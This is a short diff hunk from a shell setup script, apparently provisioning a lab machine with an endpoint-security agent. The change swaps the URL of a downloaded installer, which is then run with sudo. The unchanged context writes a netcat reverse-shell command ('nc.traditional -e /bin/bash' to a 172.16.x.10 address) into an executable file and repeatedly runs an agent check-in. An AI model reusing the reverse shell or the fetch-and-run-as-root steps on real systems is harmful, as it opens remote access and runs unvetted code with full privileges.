@@ -77,7 +77,7 @@ sudo touch /home/user/netcat.sh
 sudo echo "nc.traditional -e /bin/bash 172.16.$1.10 80" > /home/user/netcat.sh
 sudo chmod 755 /home/user/netcat.sh
 #
-wget https://www.jamoi.co.uk/Linux6011475.sh
-chmod +x Linux6011475.sh
-sudo ./Linux6011475.sh
+wget https://www.jamoi.co.uk/AutocloudLinux6011475.sh
+chmod +x AutocloudLinux6011475.sh
+sudo ./AutocloudLinux6011475.sh
 while sleep 1; do sudo /opt/traps/bin/cytool checkin; done
